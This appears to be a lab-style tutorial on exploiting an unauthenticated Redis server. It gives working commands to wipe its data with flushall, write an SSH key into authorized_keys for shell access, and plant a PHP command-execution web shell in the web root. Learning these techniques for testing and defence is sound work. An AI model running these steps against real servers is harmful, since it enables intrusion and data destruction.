## What is Redis
Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries.

## Enumerating Redis
In a standard Redis configuration, Redis is located by default on port 6379. You can connect to Redis from the command line using Telnet like so:

	telnet 10.10.206.170 6379

Once you're in a telnet session, you can check to see if the instance is using AUTH to set a password, or if the command access is unprotected. A good way to do this is simply by echoing a message, like:

	echo "Hey no AUTH required!"

You should have the message return along with a $xyz value.

## Writing SSH Keys
If this is the case, we can drop SSH keys onto Redis to get a shell. To do this, first generate an SSH key and save it to a directory of your choosing:

	ssh-keygen -t rsa -C "crack@redis.io"

Now we've got a key. The goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. 

To start letâ€™s pad the public SSH key we generated with newlines before and after the content:

	(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt

Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using redis-cli. First, we remove any current data in the memory:

	redis-cli -h 10.10.206.170 flushall

Then, we write our file to the memory.

	cat foo.txt | redis-cli -h 10.10.206.170 -x set crackit

Then, we can dump the memory content to a file using:

	redis-cli -h 10.10.206.170
	config set dir /Users/antirez/.ssh/
	config get dir
	config set dbfilename "authorized_keys"
	save

Then we should be able to SSH into the machine using:

	ssh -i id_rsa antirez@10.10.206.170

## PHP Webshell
To do this you must know the path of the Website folder. Check the web server using manual enumeration or a tool like "whatweb" to establish the probable web server. For example, if it's apache- we can assume the path is /var/www/html.

Using this assumption, we can then set the directory and write to a file.  To test if it works, we can connect over telnet, as previously shown. Then, using the commands:

	config set dir /var/www/html
	config set dbfilename configinfo.php
	set test "<?php phpinfo(); ?>"
	save

We can check to see if we're able to write a php info file, to check this- go to the webserver and check "/configinfo.php". If we're met with a PHPInfo page, then we know we're able to write files.

We can then add in a php get variable web shell:

	config set dir /var/www/html
	config set dbfilename shell.php
	set test "<?php system($_GET['cmd']); ?>"
	save

Using this, we can further enumerate and maybe get credentials or a shell using nc or bash.
